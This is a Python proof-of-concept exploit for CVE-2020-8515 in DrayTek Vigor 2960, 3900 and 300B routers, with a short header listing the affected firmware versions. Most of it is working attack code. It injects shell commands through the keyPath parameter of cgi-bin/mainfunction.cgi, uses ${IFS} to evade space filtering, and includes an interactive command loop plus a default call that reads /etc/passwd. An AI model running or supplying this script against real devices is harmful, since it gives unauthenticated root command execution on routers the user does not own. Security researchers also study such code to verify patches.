#
#Unauthenticated RCE in Draytek Vigor 2960, 3900 and 300B
#
#CVE-2020-8515
#
#DrayTek Vigor2960 1.3.1_Beta, Vigor3900 1.4.4_Beta, and Vigor300B 1.3.3_Beta, 1.4.2.1_Beta, and 1.4.4_Beta devices allow remote code execution as root (without authentication) via shell metacharacters to the cgi-bin/mainfunction.cgi URI..
#
#Affected Products:
#Vigor300B <v1.5.1
#Vigor2960 <v1.5.1
#Vigor3900 <v1.5.1
#
#Reference:
#https://github.com/imjdl/CVE-2020-8515-PoC
#

import requests
import warnings
warnings.filterwarnings("ignore")

def test_post(url,command):
    try:
        headers = {
            "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"
        }
        url = url + "/cgi-bin/mainfunction.cgi"
        command = command.replace(" ", "${IFS}")
        data = "action=login&keyPath=%27%0A%2fbin%2f" + command + "%0A%27&loginUser=a&loginPwd=a"
        res = requests.post(url=url, data=data, timeout=(10, 15), headers=headers, verify = False)
        if res.status_code == 200:
            print(res.text)
    except Exception as e:
        print("[!]Error:%s"%e)
 
def run_cmd(url,command):
    test_post(url,command)
    while(1):
        cmd = raw_input("#")
        test_post(url,cmd)
        
if __name__ == "__main__":
    test_post("https://192.168.1.1","cat /etc/passwd")

